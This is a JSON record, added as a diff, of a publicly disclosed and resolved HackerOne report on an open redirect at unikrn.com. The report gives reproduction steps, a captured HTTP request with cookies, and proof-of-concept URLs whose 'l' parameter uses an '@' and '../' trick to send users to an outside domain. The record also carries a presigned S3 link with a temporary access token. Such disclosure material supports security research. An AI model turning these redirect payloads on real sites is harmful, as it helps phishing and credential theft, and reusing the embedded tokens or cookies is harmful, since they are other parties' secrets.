@@ -1,0 +1,146 @@
+{
+  "id": 625546,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjU1NDY=",
+  "url": "https://hackerone.com/reports/625546",
+  "title": "Open Redirection leads to redirect Users to malicious website",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2019-06-22T09:51:54.371Z",
+  "submitted_at": "2019-06-22T09:51:54.371Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bb00x",
+    "url": "/bb00x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/249/293/2203a2a8b6ca501b0d4155bf58b79b508f03d67a_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2672,
+    "url": "https://hackerone.com/unikrn",
+    "handle": "unikrn",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Unikrn",
+      "twitter_handle": "unikrnco",
+      "website": "https://unikrn.com",
+      "about": "unikrn offers a world class comprehensive esports betting platform"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-05-06T15:43:19.535Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-04-06T15:43:12.734Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "---\nSummary\n---\n\nI found an open redirect bug on unikoingold.com .First, I create an account on unikoingold.com , I fill all the forms with the required information (First name,Birth,etc...), until I came on the final step to verify my account , there was a mechanism to send a verification link to my email , therefore ,I open my email an click to this LINK to confirm my account and using burp suite proxy to see what traffic is passed into this request so I came over this url `https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/../&utm_medium=doi&utm_campaign=doi_welcome` then I try to play with `l` parametre until I have redirection to my input (Malicious website with XSS code executed).\n\n---\nSteps\n---\n\n1. Create An account on unikoingold.com .\n2. Set up your Burp suite proxy with your browser .\n3. Intercept the request Like This :\n\n```http\nGET /s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f&utm_medium=doi&utm_campaign=doi_welcome HTTP/1.1\nHost: unikrn.com\nConnection: close\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\nAccept-Encoding: gzip, deflate\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: __cfduid=dc2e81d88677939ce456f73a18c2a09b51561192429; CW=fplg5rn6s118blhgpb20hi0phlhuv4jr\n```\n4 . Note the Value of ``l`` parametre \n5 . Or just Click on this [URL POC](https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/../&utm_medium=doi&utm_campaign=doi_welcome) ***You must be logged in***\n6 . Redirected successfully and Javascript code Executed .\n\n-------\n\n##POC\n* `https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/../&utm_medium=doi&utm_campaign=doi_welcome`\n \n* `https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=///localdomain.pw/%2e%2e%2f&utm_medium=doi&utm_campaign=doi_welcome`\n\n\n{F514634}\n\n-----------\n\n## Impact\n\n* An Attacker can redirect user to a malicious website and execute some dangerous script to steal credentiels .\n\n* Simplifies pishing Attacks .",
+  "bounty_amount": "50.0",
+  "formatted_bounty": "$50",
+  "weakness": {
+    "id": 53,
+    "name": "Open Redirect"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 514634,
+      "file_name": "2019-06-22_11-47-15.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/514/634/4a2ad3c772f36bf60e3422df1d4b0662bbb698e8/2019-06-22_11-47-15.mp4?response-content-disposition=attachment%3B%20filename%3D%222019-06-22_11-47-15.mp4%22%3B%20filename%2A%3DUTF-8%27%272019-06-22_11-47-15.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSBE3AKLT%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T003714Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGyieowL3ju9Q62exG%2BDTuChyVOc1Mg7%2BYJ9S8MYBpcKAiEA5C3kcaFuCmE%2F4OWx1FicS2m1oYeV2FUwJGNh7f7fPekqugUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDM3i42xq9%2Fv%2BDD7cCSqOBROdN90KKmq4dqM%2FQ1dbRpgTPSUXomx1swOP2q%2F0KMYHPJ02HBNGs4IvVDBRQk3YMZAy20pCcvff62KM9I%2BkVOpgk5DmSUK2NlOx%2Bu8uiFhvrdoku%2FRDrv6x7b0pq3RX%2BhnUtdfaInGqndlzP6kNRDWq0e4nSumeN9PCFslWQ2Gj8O0E4tDQAKVILesgZiS%2BDaEbHEX%2FnwqmE%2F3RSxh7qZt3dG%2B5Sf5U844qTzpJ2kNI4pQPRAbqPw23MkQBgKhqjNJ9IZQmD1C67skq5HJuPxeEZijHqWSALcC19ZpXWLX1ZHpXFPJfYS4pzhIS1EsUuwto6q0vJxxcDCQzLNRcRfzOHRxSJZaTPS9nN7Njx4bdtQsl1kgL9hPMs3cNJWUHhTqqLoLGi6ei0lctLur0xfzI1ExXYy1OhASR16Lkjne0PkavaqRtTCepwANIMu69ou%2BsuAbDfMrAzS1lGulslOJVUwSICLpi3Ok4CJdlEMMTAZHMA0h0wAWwF7h18u%2F9cLC2sNd8ltip4HfphzHyZD2EsXENSvWeZTAzZyYmKaG8lA2QjgDqWys6gu6QPdlu279ynr5F4B8bF1l%2FkYE1PxZT%2BPTPYRVddjAyMc%2BBpYoquMLVIOjnb72seidOB8bdiMu%2BbdRo1TbRuoPjLUhbYLZvP%2Beg%2BgKcNb4AVlT20PNahH%2BntY1h7QFUorkMUXGqfZDEesX9Eq8Cbi9zm8GdnmhcdK9sgshAugFKOF9Fj984TDn3exa%2FL9%2BAvT8xT4FnIvL5hIRfrzp6BLa9JhE96ZYkGQ7CelGJeRtIjv9TJpCT0%2FkHsj5pBLLOiVHhgDLYAx1J0mXvibP%2BnuH92QhtodPbB%2BX7ulBLzHaC1o9dEzDO5%2BPMBjqxAXQ6THfET1Jf1RRl%2Fh6TXO1%2F03cJJVqg7RWnDkklmj8YAhc9wYE28jwLo3%2FPVxuO%2BIw%2By2Djj7nQtlat2KNVBQJmPdYcK5mHmW3n2bnO0C8eGiA66LPlbeXgbY24S5z7qcsHmEeJvPbuj%2FO3%2Fpam52Wch3o9NQevxQXmsL9upnFphnbfZ%2BpLklPHg94JBDWRbPl6CHUXsCFkc6Dd3EUjFAoOT9BmgSKEMV1sAadePOBN6w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=35bc2537dad6ff10a1d410a6081871214b1eebd26d7819fb7989727db0b942c5",
+      "file_size": 859209,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-05-06T15:43:12.812Z",
+  "allow_singular_disclosure_after": -182854441.99993664,
+  "singular_disclosure_allowed": true,
+  "vote_count": 18,
+  "voters": [
+    "rook1337",
+    "ali",
+    "bb00x",
+    "sa1tama0",
+    "cryptographer",
+    "armansameer",
+    "ronindrm",
+    "muraafat",
+    "13ap",
+    "pcmaga",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "none",
+    "score": 0.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 453,
+    "asset_type": "URL",
+    "asset_identifier": "unikrn.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
